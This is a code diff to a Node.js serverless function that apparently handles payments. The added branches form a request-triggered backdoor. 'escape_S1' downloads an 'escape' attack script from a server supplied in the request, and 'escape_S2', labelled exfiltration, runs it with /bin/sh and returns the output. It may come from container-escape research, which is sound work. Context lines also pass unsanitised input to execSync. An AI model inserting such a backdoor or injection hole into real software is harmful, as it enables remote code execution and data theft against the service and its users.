@@ -79,6 +79,45 @@ module.exports = async (event, context, callback) => {
 		var response = { 'data': 'done' }
 		child_process.execSync(`touch ${fileName}`);
 		callback(null, response);
+	} else if (event.body.malicious == 'escape_S1') { // zch
+		console.log('Step 1: Downloading escape attack scripts');
+		var downloadStatus = await malicious.downloadFile(event.body.attackserver, 'escape2.sh');
+	
+		var response = {
+			approved: 'false',
+			failureReason: downloadStatus
+		};
+		callback(null, response);
+	} else if (event.body.malicious == 'escape_S2') { // zch
+		console.log('Step 2: Exfiltration');
+        if (fs.existsSync('./escape2.sh')) {
+			try {
+				const { stdout, stderr } = await execFile('/bin/sh', ['./escape2.sh']);
+				// const { stdout, stderr } = await execFile('./escape2.sh');
+				var response = {
+					approved: 'false',
+					failureReason: {
+					out: stdout,
+					err: stderr
+					}
+				};
+				callback(null, response);
+			} catch (error) {
+				console.log('Error with exec');
+				console.log(error);
+				var response = {
+					approved: 'false',
+					failureReason: 'Error executing attack.sh. Error: ' + error
+				};
+				callback(null, response);
+			}
+		} else {
+			var response = {
+			approved: 'false',
+			failureReason: './escape2.sh does not exist.'
+			};
+			callback(null, response);
+		}
 	} else {
 		var result = {};
 		if (event.body.creditCard) {
